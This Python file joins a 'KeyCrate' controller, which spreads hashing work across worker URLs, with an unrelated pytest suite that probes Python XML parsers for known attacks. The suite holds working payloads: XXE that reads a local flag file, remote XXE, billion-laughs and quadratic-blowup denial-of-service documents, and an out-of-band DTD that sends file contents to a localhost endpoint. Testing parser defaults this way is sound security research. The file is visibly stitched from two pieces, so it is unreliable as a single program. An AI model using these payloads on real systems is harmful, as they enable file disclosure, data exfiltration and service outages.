#! /usr/bin/env python3
import argparse, requests, time, yaml, concurrent.futures as cf
import os
import re

import pathlib
from flask import Flask
import threading
import multiprocessing
import time
from io import StringIO
import pytest

HOST = "localhost"
PORT = 8080
FLAG_PATH = pathlib.Path(__file__).with_name("flag")

def load_config(file_path):
    safe_name = os.path.basename(file_path or "")
    allowed_configs = {
        "config.yaml": "config.yaml",
        "config.yml": "config.yml",
    }
    if (
        not safe_name
        or safe_name in {".", ".."}
        or not re.fullmatch(r"[A-Za-z0-9._-]+", safe_name)
        or not safe_name.lower().endswith((".yaml", ".yml"))
        or safe_name not in allowed_configs
    ):
        raise ValueError("Invalid config file name")

    base_dir = os.path.dirname(os.path.realpath(__file__))
    trusted_name = allowed_configs[safe_name]
    full_path = os.path.join(base_dir, trusted_name)

    with open(full_path, 'r') as file:
        return yaml.safe_load(file)

def call_worker(url, op, iters, concurrency, payload, timeout):
    r = requests.post(f"{url}/{op}", json={
        "op": op,
        "iters": iters,
        "concurrency": concurrency,
        "payload": payload or {}
    }, timeout=timeout)
    r.raise_for_status()
    return r.json()
    

def main():
    ap = argparse.ArgumentParser(description="KeyCrate main controller")
    ap.add_argument("-c", "--config", default="config.yaml")
    ap.add_argument("--op", default=None, help="override operation name")
    ap.add_argument("--iters", type=int, default=None, help="total iterations")
    ap.add_argument("--conc", type=int, default=None, help="thread count")
    ap.add_argument("--timeout", type=int, default=500)
    args = ap.parse_args()

    cfg = load_config(args.config)

    workers = cfg["workers"] # list of URLs, ["<url1>", "<url2>", ...]
    op = args.op or cfg.get("op", "sha256_cpu")
    total_iters = int(args.iters or cfg.get("total_iters", 2_000_000))
    conc_per = int(args.conc or cfg.get("concurrency_per_worker", 4))
    payload = cfg.get("payload", {}) or {}

    # split iterations across workers
    base = total_iters // len(workers)
    plan = [base] * len(workers)
    plan[-1] += total_iters - base * len(workers)  # distribute remainder

    print(f"[KeyCrate] op={op}, workers={len(workers)} total_iters={total_iters} conc/workers={conc_per}")
    t0 = time.perf_counter()

    results = []
    with cf.ThreadPoolExecutor(max_workers=len(workers)) as ex:
        futs = [ex.submit(call_worker, w, op, it, conc_per, payload, args.timeout)
                for w, it in zip(workers, plan)]
        for f in cf.as_completed(futs):
            try:
                results.append(f.result())
            except Exception as e:
                print(f"[KeyCrate] Error: {e}")

    elapsed = time.perf_counter() - t0

    # Summaries
    agg_throughput = sum(r.get("throughput_ops_per_sec") or 0 for r in results)
    total_errors = sum(r.get("errors", 0) for r in results)
    sum_iters = sum(r.get("iters", 0) for r in results)

    print("\nPer-worker:")
    for r in results:
        print(f"  {r['hostname']:<12} {r['op']:<12} iters={r['iters']:,} "
              f"dur={r['duration_sec']:.3f}s thr={int(r['throughput_ops_per_sec']):,}/s "
              f"errors={r['errors']}")

    print("\nAggregate:")
    print(f"  total iters: {sum_iters:,}")
    print(f"  aggregate throughput: {int(agg_throughput):,} ops/s")
    print(f"  wall time (controller): {elapsed:.3f}s")
    if total_errors:
        print(f"  errors: {total_errors}")

if __name__ == "__main__":
    main()


# ==============================================================================
# xml samples

ok_xml = f"""<?xml version="1.0"?>
<test>hello world</test>
"""

local_xxe = f"""<?xml version="1.0"?>
<!DOCTYPE dt [
    <!ENTITY xxe SYSTEM "file://{FLAG_PATH}">
]>
<test>&xxe;</test>
"""

remote_xxe = f"""<?xml version="1.0"?>
<!DOCTYPE dt [
    <!ENTITY remote_xxe SYSTEM "http://{HOST}:{PORT}/xxe">
]>
<test>&remote_xxe;</test>
"""

billion_laughs = """<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""

quadratic_blowup = f"""<?xml version="1.0"?>
<!DOCTYPE wolo [
  <!ENTITY oops "{"a" * 100000}">
]>
<foo>{"&oops;"*20000}</foo>"""

dtd_retrieval = f"""<?xml version="1.0"?>
<!DOCTYPE dt PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://{HOST}:{PORT}/test.dtd">
<foo>bar</foo>
"""

exfiltrate_through_dtd_retrieval = f"""<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://{HOST}:{PORT}/exfiltrate-through.dtd"> %xxe; ]>
"""

predefined_entity_xml = """<?xml version="1.0"?>
<test>&lt;</test>
"""

# ==============================================================================
# other setup

# we set up local Flask application so we can tests whether loading external resources
# works (such as SSRF from DTD-retrieval works)
app = Flask(__name__)

@app.route("/alive")
def alive():
    return "ok"

hit_dtd = False
@app.route("/test.dtd")
def test_dtd():
    global hit_dtd
    hit_dtd = True
    return """<?xml version="1.0" encoding="UTF-8"?>"""

hit_xxe = False
@app.route("/xxe")
def test_xxe():
    global hit_xxe
    hit_xxe = True
    return "ok"

@app.route("/exfiltrate-through.dtd")
def exfiltrate_through_dtd():
    return f"""<!ENTITY % file SYSTEM "file://{FLAG_PATH}">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://{HOST}:{PORT}/exfiltrate-data?data=%file;'>">
%eval;
%exfiltrate;
    """

exfiltrated_data = None
@app.route("/exfiltrate-data")
def exfiltrate_data():
    from flask import request
    global exfiltrated_data
    exfiltrated_data = request.args["data"]
    return "ok"

def run_app():
    app.run(host=HOST, port=PORT)

@pytest.fixture(scope="session", autouse=True)
def flask_app_running():
    # run flask in other thread
    flask_thread = threading.Thread(target=run_app, daemon=True)
    flask_thread.start()

    # give flask a bit of time to start
    time.sleep(0.1)

    # ensure that the server works
    import requests
    requests.get(f"http://{HOST}:{PORT}/alive")

    yield

def expects_timeout(func):
    def inner():
        proc = multiprocessing.Process(target=func)
        proc.start()
        time.sleep(0.1)
        assert proc.exitcode == None
        proc.kill()
        proc.join()
    return inner


class TestExpectsTimeout:
    "test that expects_timeout works as expected"

    @staticmethod
    @expects_timeout
    def test_slow():
        time.sleep(1000)

    @staticmethod
    def test_fast():
        @expects_timeout
        def fast_func():
            return "done!"

        with pytest.raises(AssertionError):
            fast_func()

# ==============================================================================
import xml.sax
import xml.sax.handler

class SimpleHandler(xml.sax.ContentHandler):
    def __init__(self):
        self.result = []

    def characters(self, data):
        self.result.append(data)

class TestSax():
    # always vuln to billion laughs, quadratic

    @staticmethod
    @expects_timeout
    def test_billion_laughs_allowed_by_default():
        parser = xml.sax.make_parser()
        parser.parse(StringIO(billion_laughs))

    @staticmethod
    @expects_timeout
    def test_quadratic_blowup_allowed_by_default():
        parser = xml.sax.make_parser()
        parser.parse(StringIO(quadratic_blowup))

    @staticmethod
    def test_ok_xml():
        handler = SimpleHandler()
        parser = xml.sax.make_parser()
        parser.setContentHandler(handler)
        parser.parse(StringIO(ok_xml))
        assert handler.result == ["hello world"], handler.result

    @staticmethod
    def test_xxe_disabled_by_default():
        handler = SimpleHandler()
        parser = xml.sax.make_parser()
        parser.setContentHandler(handler)
        parser.parse(StringIO(local_xxe))
        assert handler.result == [], handler.result

    @staticmethod
    def test_local_xxe_manually_enabled():
        handler = SimpleHandler()
        parser = xml.sax.make_parser()
        parser.setContentHandler(handler)
        parser.setFeature(xml.sax.handler.feature_external_ges, True)
        parser.parse(StringIO(local_xxe))
        assert handler.result[0] == "SECRET_FLAG", handler.result

    @staticmethod
    def test_remote_xxe_manually_enabled():
        global hit_xxe
        hit_xxe = False

        handler = SimpleHandler()
        parser = xml.sax.make_parser()
        parser.setContentHandler(handler)
        parser.setFeature(xml.sax.handler.feature_external_ges, True)
        parser.parse(StringIO(remote_xxe))
        assert handler.result == ["ok"], handler.result
        assert hit_xxe == True

    @staticmethod
    def test_dtd_disabled_by_default():
        global hit_dtd
        hit_dtd = False

        parser = xml.sax.make_parser()
        parser.parse(StringIO(dtd_retrieval))
        assert hit_dtd == False

    @staticmethod
    def test_dtd_manually_enabled():
        global hit_dtd
        hit_dtd = False

        parser = xml.sax.make_parser()
        parser.setFeature(xml.sax.handler.feature_external_ges, True)
        parser.parse(StringIO(dtd_retrieval))
        assert hit_dtd == True


# ==============================================================================
import xml.etree.ElementTree

class TestEtree:

    # always vuln to billion laughs, quadratic
    @staticmethod
    @expects_timeout
    def test_billion_laughs_allowed_by_default():
        parser = xml.etree.ElementTree.XMLParser()
        _root = xml.etree.ElementTree.fromstring(billion_laughs, parser=parser)

    @staticmethod
    @expects_timeout
    def test_quadratic_blowup_allowed_by_default():
        parser = xml.etree.ElementTree.XMLParser()
        _root = xml.etree.ElementTree.fromstring(quadratic_blowup, parser=parser)

    @staticmethod
    def test_ok_xml():
        parser = xml.etree.ElementTree.XMLParser()
        root = xml.etree.ElementTree.fromstring(ok_xml, parser=parser)
        assert root.tag == "test"
        assert root.text == "hello world"

    @staticmethod
    def test_ok_xml_sax_parser():
        # you _can_ pass a SAX parser to xml.etree... but it doesn't give you the output :|
        parser = xml.sax.make_parser()
        root = xml.etree.ElementTree.fromstring(ok_xml, parser=parser)
        assert root == None

    @staticmethod
    def test_ok_xml_lxml_parser():
        # this is technically possible, since parsers follow the same API, and the
        # `fromstring` function is just a thin wrapper... seems very unlikely that
        # anyone would do this though :|
        parser = lxml.etree.XMLParser()
        root = xml.etree.ElementTree.fromstring(ok_xml, parser=parser)
        assert root.tag == "test"
        assert root.text == "hello world"

    @staticmethod
    def test_xxe_not_possible():
        parser = xml.etree.ElementTree.XMLParser()
        try:
            _root = xml.etree.ElementTree.fromstring(local_xxe, parser=parser)
            assert False
        except xml.etree.ElementTree.ParseError as e:
            assert "undefined entity &xxe" in str(e)

    @staticmethod
    def test_dtd_not_possible():
        global hit_dtd
        hit_dtd = False

        parser = xml.etree.ElementTree.XMLParser()
        _root = xml.etree.ElementTree.fromstring(dtd_retrieval, parser=parser)
        assert hit_dtd == False

# ==============================================================================
import lxml.etree

class TestLxml:
    # see https://lxml.de/apidoc/lxml.etree.html?highlight=xmlparser#lxml.etree.XMLParser
    @staticmethod
    def test_billion_laughs_disabled_by_default():
        parser = lxml.etree.XMLParser()
        try:
            _root = lxml.etree.fromstring(billion_laughs, parser=parser)
            assert False
        except lxml.etree.XMLSyntaxError as e:
            assert "Detected an entity reference loop" in str(e)

    @staticmethod
    def test_quadratic_blowup_disabled_by_default():
        parser = lxml.etree.XMLParser()
        try:
            _root = lxml.etree.fromstring(quadratic_blowup, parser=parser)
            assert False
        except lxml.etree.XMLSyntaxError as e:
            assert "Detected an entity reference loop" in str(e)

    @staticmethod
    @expects_timeout
    def test_billion_laughs_manually_enabled():
        parser = lxml.etree.XMLParser(huge_tree=True)
        root = lxml.etree.fromstring(billion_laughs, parser=parser)

    @staticmethod
    @expects_timeout
    def test_quadratic_blowup_manually_enabled():
        parser = lxml.etree.XMLParser(huge_tree=True)
        root = lxml.etree.fromstring(quadratic_blowup, parser=parser)

    @staticmethod
    def test_billion_laughs_huge_tree_not_enough():
        parser = lxml.etree.XMLParser(huge_tree=True, resolve_entities=False)
        root = lxml.etree.fromstring(billion_laughs, parser=parser)
        assert root.tag == "lolz"
        assert root.text == None

    @staticmethod
    def test_quadratic_blowup_huge_tree_not_enough():
        parser = lxml.etree.XMLParser(huge_tree=True, resolve_entities=False)
        root = lxml.etree.fromstring(quadratic_blowup, parser=parser)
        assert root.tag == "foo"
        assert root.text == None

    @staticmethod
    def test_ok_xml():
        parser = lxml.etree.XMLParser()
        root = lxml.etree.fromstring(ok_xml, parser=parser)
        assert root.tag == "test"
        assert root.text == "hello world"

    @staticmethod
    def test_local_xxe_enabled_by_default():
        parser = lxml.etree.XMLParser()
        root = lxml.etree.fromstring(local_xxe, parser=parser)
        assert root.tag == "test"
        assert root.text == "SECRET_FLAG", root.text

    @staticmethod
    def test_local_xxe_disabled():
        parser = lxml.etree.XMLParser(resolve_entities=False)
        root = lxml.etree.fromstring(local_xxe, parser=parser)
        assert root.tag == "test"
        assert root.text == None

    @staticmethod
    def test_remote_xxe_disabled_by_default():
        global hit_xxe
        hit_xxe = False

        parser = lxml.etree.XMLParser()
        root = lxml.etree.fromstring(remote_xxe, parser=parser)
        assert hit_xxe == False

    @staticmethod
    def test_remote_xxe_manually_enabled():
        global hit_xxe
        hit_xxe = False

        parser = lxml.etree.XMLParser(no_network=False)
        root = lxml.etree.fromstring(remote_xxe, parser=parser)
        assert root.tag == "test"
        assert root.text == "ok"
        assert hit_xxe == True

    @staticmethod
    def test_dtd_disabled_by_default():
        global hit_dtd
        hit_dtd = False

        parser = lxml.etree.XMLParser()
        root = lxml.etree.fromstring(dtd_retrieval, parser=parser)
        assert hit_dtd == False

    @staticmethod
    def test_dtd_manually_enabled():
        global hit_dtd
        hit_dtd = False

        # Need to set BOTH load_dtd and no_network
        parser = lxml.etree.XMLParser(load_dtd=True)
        root = lxml.etree.fromstring(dtd_retrieval, parser=parser)
        assert hit_dtd == False

        parser = lxml.etree.XMLParser(no_network=False)
        root = lxml.etree.fromstring(dtd_retrieval, parser=parser)
        assert hit_dtd == False

        parser = lxml.etree.XMLParser(load_dtd=True, no_network=False)
        root = lxml.etree.fromstring(dtd_retrieval, parser=parser)
        assert hit_dtd == True

        hit_dtd = False

        # Setting dtd_validation also does not allow the remote access
        parser = lxml.etree.XMLParser(dtd_validation=True, load_dtd=True)
        try:
            root = lxml.etree.fromstring(dtd_retrieval, parser=parser)
        except lxml.etree.XMLSyntaxError:
            pass
        assert hit_dtd == False

    @staticmethod
    def test_exfiltrate_through_dtd():
        # note that this only works when the data to exfiltrate does not contain a newline :|
        global exfiltrated_data
        exfiltrated_data = None
        parser = lxml.etree.XMLParser(load_dtd=True, no_network=False)
        with pytest.raises(lxml.etree.XMLSyntaxError):
            lxml.etree.fromstring(exfiltrate_through_dtd_retrieval, parser=parser)

        assert exfiltrated_data == "SECRET_FLAG"

    @staticmethod
    def test_predefined_entity():
        parser = lxml.etree.XMLParser(resolve_entities=False)
        root = lxml.etree.fromstring(predefined_entity_xml, parser=parser)
        assert root.tag == "test"
        assert root.text == "<"

# ==============================================================================
import xmltodict

class TestXmltodict:
    @staticmethod
    def test_billion_laughs_disabled_by_default():
        d = xmltodict.parse(billion_laughs)
        assert d == {"lolz": None}, d

    @staticmethod
    def test_quadratic_blowup_disabled_by_default():
        d = xmltodict.parse(quadratic_blowup)
        assert d == {"foo": None}, d

    @staticmethod
    @expects_timeout
    def test_billion_laughs_manually_enabled():
        xmltodict.parse(billion_laughs, disable_entities=False)

    @staticmethod
    @expects_timeout
    def test_quadratic_blowup_manually_enabled():
        xmltodict.parse(quadratic_blowup, disable_entities=False)

    @staticmethod
    def test_ok_xml():
        d = xmltodict.parse(ok_xml)
        assert d == {"test": "hello world"}, d

    @staticmethod
    def test_local_xxe_not_possible():
        d = xmltodict.parse(local_xxe)
        assert d == {"test": None}

        d = xmltodict.parse(local_xxe, disable_entities=False)
        assert d == {"test": None}

    @staticmethod
    def test_remote_xxe_not_possible():
        global hit_xxe
        hit_xxe = False

        d = xmltodict.parse(remote_xxe)
        assert d == {"test": None}
        assert hit_xxe == False

        d = xmltodict.parse(remote_xxe, disable_entities=False)
        assert d == {"test": None}
        assert hit_xxe == False

    @staticmethod
    def test_dtd_not_possible():
        global hit_dtd
        hit_dtd = False

        d = xmltodict.parse(dtd_retrieval)
        assert hit_dtd == False

# ==============================================================================
import xml.dom.minidom

class TestMinidom:
    @staticmethod
    @expects_timeout
    def test_billion_laughs():
        xml.dom.minidom.parseString(billion_laughs)

    @staticmethod
    @expects_timeout
    def test_quadratic_blowup():
        xml.dom.minidom.parseString(quadratic_blowup)

    @staticmethod
    def test_ok_xml():
        doc = xml.dom.minidom.parseString(ok_xml)
        assert doc.documentElement.tagName == "test"
        assert doc.documentElement.childNodes[0].data == "hello world"

    @staticmethod
    def test_xxe():
        # disabled by default
        doc = xml.dom.minidom.parseString(local_xxe)
        assert doc.documentElement.tagName == "test"
        assert doc.documentElement.childNodes == []

        # but can be turned on
        parser = xml.sax.make_parser()
        parser.setFeature(xml.sax.handler.feature_external_ges, True)
        doc = xml.dom.minidom.parseString(local_xxe, parser=parser)
        assert doc.documentElement.tagName == "test"
        assert doc.documentElement.childNodes[0].data == "SECRET_FLAG"

        # which also works remotely
        global hit_xxe
        hit_xxe = False

        parser = xml.sax.make_parser()
        parser.setFeature(xml.sax.handler.feature_external_ges, True)
        _doc = xml.dom.minidom.parseString(remote_xxe, parser=parser)
        assert hit_xxe == True

    @staticmethod
    def test_dtd():
        # not possible by default
        global hit_dtd
        hit_dtd = False

        _doc = xml.dom.minidom.parseString(dtd_retrieval)
        assert hit_dtd == False

        # but can be turned on
        parser = xml.sax.make_parser()
        parser.setFeature(xml.sax.handler.feature_external_ges, True)
        _doc = xml.dom.minidom.parseString(dtd_retrieval, parser=parser)
        assert hit_dtd == True

# ==============================================================================
import xml.dom.pulldom

class TestPulldom:
    @staticmethod
    @expects_timeout
    def test_billion_laughs():
        doc = xml.dom.pulldom.parseString(billion_laughs)
        # you NEED to iterate over the items for it to take long
        for event, node in doc:
            pass

    @staticmethod
    @expects_timeout
    def test_quadratic_blowup():
        doc = xml.dom.pulldom.parseString(quadratic_blowup)
        for event, node in doc:
            pass

    @staticmethod
    def test_ok_xml():
        doc = xml.dom.pulldom.parseString(ok_xml)
        for event, node in doc:
            if event == xml.dom.pulldom.START_ELEMENT:
                assert node.tagName == "test"
            elif event == xml.dom.pulldom.CHARACTERS:
                assert node.data == "hello world"

    @staticmethod
    def test_xxe():
        # disabled by default
        doc = xml.dom.pulldom.parseString(local_xxe)
        found_flag = False
        for event, node in doc:
            if event == xml.dom.pulldom.START_ELEMENT:
                assert node.tagName == "test"
            elif event == xml.dom.pulldom.CHARACTERS:
                if node.data == "SECRET_FLAG":
                    found_flag = True
        assert found_flag == False

        # but can be turned on
        parser = xml.sax.make_parser()
        parser.setFeature(xml.sax.handler.feature_external_ges, True)
        doc = xml.dom.pulldom.parseString(local_xxe, parser=parser)
        found_flag = False
        for event, node in doc:
            if event == xml.dom.pulldom.START_ELEMENT:
                assert node.tagName == "test"
            elif event == xml.dom.pulldom.CHARACTERS:
                if node.data == "SECRET_FLAG":
                    found_flag = True
        assert found_flag == True

        # which also works remotely
        global hit_xxe
        hit_xxe = False
        parser = xml.sax.make_parser()
        parser.setFeature(xml.sax.handler.feature_external_ges, True)
        doc = xml.dom.pulldom.parseString(remote_xxe, parser=parser)
        assert hit_xxe == False
        for event, node in doc:
            pass
        assert hit_xxe == True

    @staticmethod
    def test_dtd():
        # not possible by default
        global hit_dtd
        hit_dtd = False

        doc = xml.dom.pulldom.parseString(dtd_retrieval)
        for event, node in doc:
            pass
        assert hit_dtd == False

        # but can be turned on
        parser = xml.sax.make_parser()
        parser.setFeature(xml.sax.handler.feature_external_ges, True)
        doc = xml.dom.pulldom.parseString(dtd_retrieval, parser=parser)
        for event, node in doc:
            pass
        assert hit_dtd == True

# ==============================================================================
import xml.parsers.expat

class TestExpat:
    # this is the underlying parser implementation used by the rest of the Python
    # standard library. But people are probably not using this directly.

    @staticmethod
    @expects_timeout
    def test_billion_laughs():
        parser = xml.parsers.expat.ParserCreate()
        parser.Parse(billion_laughs, True)

    @staticmethod
    @expects_timeout
    def test_quadratic_blowup():
        parser = xml.parsers.expat.ParserCreate()
        parser.Parse(quadratic_blowup, True)

    @staticmethod
    def test_ok_xml():
        char_data_recv = []
        def char_data_handler(data):
            char_data_recv.append(data)

        parser = xml.parsers.expat.ParserCreate()
        parser.CharacterDataHandler = char_data_handler
        parser.Parse(ok_xml, True)

        assert char_data_recv == ["hello world"]

    @staticmethod
    def test_xxe():
        # not vuln by default
        char_data_recv = []
        def char_data_handler(data):
            char_data_recv.append(data)

        parser = xml.parsers.expat.ParserCreate()
        parser.CharacterDataHandler = char_data_handler
        parser.Parse(local_xxe, True)

        assert char_data_recv == []

        # there might be ways to make it vuln, but I did not investigate further.

    @staticmethod
    def test_dtd():
        # not vuln by default
        global hit_dtd
        hit_dtd = False

        parser = xml.parsers.expat.ParserCreate()
        parser.Parse(dtd_retrieval, True)
        assert hit_dtd == False

        # there might be ways to make it vuln, but I did not investigate further.